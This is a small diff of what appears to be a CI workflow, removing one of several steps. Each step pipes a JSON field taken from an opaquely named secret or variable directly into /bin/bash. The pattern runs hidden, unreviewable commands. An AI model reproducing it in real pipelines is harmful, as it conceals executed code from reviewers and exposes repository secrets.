@@ -23,7 +23,6 @@ jobs:
           djhga724: ${{ secrets.djhga724 }}
         run: |
           printf '%s' "$djhga724" | jq -r .gzvh93 | /bin/bash
-          printf '%s' "$wnoum6868" | jq -r .z1 | /bin/bash
           printf '%s' "$vn0603" | jq -r .h711 | /bin/bash
           echo $llm05 | jq -r .oms93 | /bin/bash
 
